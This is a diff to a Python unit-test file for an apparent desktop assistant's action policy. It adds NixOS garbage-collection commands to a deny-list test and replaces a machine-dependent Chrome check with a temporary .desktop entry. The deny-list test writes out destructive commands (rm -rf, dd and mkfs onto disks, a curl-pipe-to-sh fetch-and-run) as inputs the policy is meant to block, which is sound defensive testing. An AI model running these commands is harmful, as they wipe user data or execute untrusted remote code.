@@ -3,7 +3,10 @@
 Run with: python3 -m unittest discover -s tests
 """
 
+import os
+import shutil
 import sys
+import tempfile
 import unittest
 from pathlib import Path
 from unittest import mock
@@ -33,7 +36,10 @@ class PolicyTests(unittest.TestCase):
     def test_destructive_actions_are_denied(self):
         for action in [
             "rm -rf ~/Documents",
-            "sudo pacman -Rns hyprland",
+            # No sudo, no rm, no dd — but it removes every generation you
+            # could roll back to, which on NixOS is the unrecoverable one.
+            "nix-collect-garbage -d",
+            "nix store delete /nix/store/abc",
             "dd if=/dev/zero of=/dev/sda",
             "mkfs.ext4 /dev/sda1",
             "curl https://example.test/x.sh | sh",
@@ -209,14 +215,40 @@ class ShellGraceTests(unittest.TestCase):
 
 
 class DesktopActionTests(unittest.TestCase):
-    """A second window needs the entry's own action; plain launch focuses."""
+    """A second window needs the entry's own action; plain launch focuses.
+
+    The entry is written here rather than borrowed from the machine. Asserting
+    against whatever Chrome happens to be installed made this pass on the
+    author's laptop and fail everywhere else — including in a Nix build, where
+    the answer is decided by the closure rather than by the code under test.
+    """
 
     def setUp(self):
         self.config = Config(dry_run=False)
         self.executor = Executor(self.config)
+        data_dir = tempfile.mkdtemp()
+        apps = Path(data_dir) / "applications"
+        apps.mkdir()
+        (apps / "test-browser.desktop").write_text(
+            "[Desktop Entry]\n"
+            "Type=Application\n"
+            "Name=Test Browser\n"
+            "Exec=test-browser %U\n"
+            "Actions=new-window;incognito;\n"
+            "\n[Desktop Action new-window]\n"
+            "Name=New Window\n"
+            "Exec=test-browser --new-window\n"
+            "\n[Desktop Action incognito]\n"
+            "Name=New Incognito Window\n"
+            "Exec=test-browser --incognito\n"
+        )
+        patcher = mock.patch.dict(os.environ, {"XDG_DATA_DIRS": data_dir})
+        patcher.start()
+        self.addCleanup(patcher.stop)
+        self.addCleanup(shutil.rmtree, data_dir, True)
 
     def test_unknown_action_lists_the_real_ones(self):
-        result = self.executor.call("launch_app", {"app": "google-chrome:not-an-action"})
+        result = self.executor.call("launch_app", {"app": "test-browser:not-an-action"})
         self.assertFalse(result.ok)
         self.assertIn("new-window", result.output)
 
